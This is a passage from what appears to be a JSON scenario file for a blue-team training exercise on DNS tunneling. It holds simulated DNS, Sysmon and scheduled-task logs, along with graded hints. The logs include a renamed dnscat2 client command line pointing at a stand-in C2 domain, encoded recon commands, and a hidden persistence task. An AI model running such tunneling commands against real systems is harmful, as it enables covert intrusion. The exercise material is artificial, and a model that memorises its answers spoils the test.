          "sourceIp": "10.0.1.92",
          "timestamp": "2025-09-18T09:30:15Z",
          "isEvidence": true,
          "evidenceTag": "SIEM_DNS_TUNNEL_ALERT",
          "sortOrder": 8
        }
      ],
      "hints": [
        {
          "content": "Compare the normal DNS queries (google.com, office365.com) to the suspicious ones. Normal queries have short, readable domain names (15-40 characters). The tunneling queries have 60-80+ character names with high-entropy Base64-encoded subdomains.",
          "pointsPenalty": 3,
          "sortOrder": 1
        },
        {
          "content": "The TTL of 0 on the suspicious DNS responses is a critical indicator. Normal DNS responses have TTLs of 60-3600 seconds. A TTL of 0 means the response must never be cached, ensuring every query reaches the attacker's authoritative nameserver — essential for real-time C2 communication.",
          "pointsPenalty": 4,
          "sortOrder": 2
        },
        {
          "content": "The Sysmon log reveals the tunneling client binary. Look at the 'OriginalFileName' field: it says 'dnscat2-client.exe' even though the file was renamed to 'svchost-update.exe'. The command line also reveals the C2 domain and a shared secret for encryption.",
          "pointsPenalty": 5,
          "sortOrder": 3
        }
      ]
    },
    {
      "stageNumber": 3,
      "title": "C2 Command Execution",
      "description": "The attacker now has a functioning DNS tunnel and is executing commands on the compromised host. Analyze the C2 activity including reconnaissance commands, persistence mechanisms, and the steady beaconing pattern.",
      "unlockCondition": "AFTER_PREVIOUS",
      "logs": [
        {
          "logType": "DNS",
          "summary": "DNS Log — TXT query containing encoded C2 beacon at T+30s interval. The response TXT record contains Base64-encoded commands being sent from the C2 server to the compromised host. Decoded response: 'cmd:whoami /all && systeminfo && net user'.",
          "rawLog": {
            "timestamp": "2025-09-18T09:31:00Z",
            "queryName": "YmVhY29uX3BrdF9zZXExMjNfYWN0aXZl.cmd.data.ns1.updateservice-cdn.com",
            "queryType": "TXT",
            "queryClass": "IN",
            "responseCode": "NOERROR",
            "responseData": "\"Y21kOndob2FtaSAvYWxsICYmIHN5c3RlbWluZm8gJiYgbmV0IHVzZXI=\"",
            "srcIp": "10.0.1.92",
            "srcPort": 53100,
            "dstIp": "10.0.2.1",
            "dstPort": 53,
            "protocol": "UDP",
            "hostname": "WS-PC15",
            "dnsServer": "10.0.2.1",
            "flags": "QR,RD,RA",
            "ttl": 0,
            "querySize": 82,
            "responseSize": 148
          },
          "severity": "HIGH",
          "hostname": "WS-PC15",
          "sourceIp": "10.0.1.92",
          "destIp": "10.0.2.1",
          "timestamp": "2025-09-18T09:31:00Z",
          "isEvidence": true,
          "evidenceTag": "C2_RECON_COMMAND",
          "sortOrder": 1
        },
        {
          "logType": "SYSMON",
          "summary": "Sysmon Event ID 1 — The DNS tunnel client (svchost-update.exe) spawned cmd.exe to execute reconnaissance commands: 'whoami /all', 'systeminfo', and 'net user'. This is standard post-compromise enumeration (T1033, T1082, T1087).",
          "rawLog": {
            "EventID": 1,
            "Source": "Microsoft-Windows-Sysmon",
            "UtcTime": "2025-09-18T09:31:02Z",
            "ProcessGuid": "{WS-PC15-a1b2c3d4-0010}",
            "ProcessId": 10244,
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c whoami /all && systeminfo && net user",
            "ParentProcessGuid": "{WS-PC15-a1b2c3d4-0005}",
            "ParentProcessId": 9120,
            "ParentImage": "C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe",
            "ParentCommandLine": "\"C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe\" --dns data.ns1.updateservice-cdn.com --secret 4d6573746f6e --maxlen 57",
            "User": "CORP\\a.kumar",
            "Hashes": "SHA256=b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9",
            "IntegrityLevel": "Medium"
          },
          "severity": "HIGH",
          "hostname": "WS-PC15",
          "username": "a.kumar",
          "processName": "cmd.exe",
          "eventId": "1",
          "timestamp": "2025-09-18T09:31:02Z",
          "isEvidence": true,
          "evidenceTag": "C2_RECON_EXECUTION",
          "sortOrder": 2
        },
        {
          "logType": "DNS",
          "summary": "DNS Log — Steady beaconing pattern observed. TXT query at exactly T+30s from previous beacon (09:31:30). The regular 30-second interval is a hallmark of automated C2 beaconing, distinguishable from human-driven DNS activity which has irregular timing.",
          "rawLog": {
            "timestamp": "2025-09-18T09:31:30Z",
            "queryName": "YmVhY29uX3BrdF9zZXExMjRfYWN0aXZl.cmd.data.ns1.updateservice-cdn.com",
            "queryType": "TXT",
            "queryClass": "IN",
            "responseCode": "NOERROR",
            "responseData": "\"Y21kOm5ldCBncm91cCAiRG9tYWluIEFkbWlucyIgL2RvbWFpbg==\"",
            "srcIp": "10.0.1.92",
            "srcPort": 53102,
            "dstIp": "10.0.2.1",
            "dstPort": 53,
            "protocol": "UDP",
            "hostname": "WS-PC15",
            "dnsServer": "10.0.2.1",
            "flags": "QR,RD,RA",
            "ttl": 0,
            "querySize": 82,
            "responseSize": 152
          },
          "severity": "HIGH",
          "hostname": "WS-PC15",
          "sourceIp": "10.0.1.92",
          "destIp": "10.0.2.1",
          "timestamp": "2025-09-18T09:31:30Z",
          "isEvidence": true,
          "evidenceTag": "C2_BEACON_30S",
          "sortOrder": 3
        },
        {
          "logType": "WINDOWS_EVENT",
          "summary": "Windows Event ID 4698 — Scheduled task created on WS-PC15. Task name 'WindowsUpdateCheck' set to run 'svchost-update.exe' at system startup and every 4 hours. This establishes persistence for the DNS tunneling client (T1053.005).",
          "rawLog": {
            "EventID": 4698,
            "Source": "Microsoft-Windows-Security-Auditing",
            "TimeCreated": "2025-09-18T09:35:18Z",
            "Computer": "WS-PC15.corp.local",
            "SubjectUserName": "a.kumar",
            "SubjectDomainName": "CORP",
            "SubjectLogonId": "0x3E7",
            "TaskName": "\\WindowsUpdateCheck",
            "TaskContent": {
              "RegistrationInfo": {
                "Date": "2025-09-18T09:35:18Z",
                "Author": "Microsoft Corporation",
                "Description": "Checks for Windows updates periodically"
              },
              "Triggers": [
                {
                  "LogonTrigger": {
                    "Enabled": true
                  }
                },
                {
                  "TimeTrigger": {
                    "Repetition": {
                      "Interval": "PT4H",
                      "StopAtDurationEnd": false
                    },
                    "StartBoundary": "2025-09-18T09:35:00Z",
                    "Enabled": true
                  }
                }
              ],
              "Actions": {
                "Exec": {
                  "Command": "C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe",
                  "Arguments": "--dns data.ns1.updateservice-cdn.com --secret 4d6573746f6e --maxlen 57"
                }
              },
              "Settings": {
                "Hidden": true,
                "RunOnlyIfIdle": false,
                "DisallowStartIfOnBatteries": false
              }
            }
          },
          "severity": "HIGH",
          "hostname": "WS-PC15",
          "username": "a.kumar",
          "eventId": "4698",
          "timestamp": "2025-09-18T09:35:18Z",
          "isEvidence": true,
          "evidenceTag": "PERSISTENCE_SCHTASK",
          "sortOrder": 4
        },
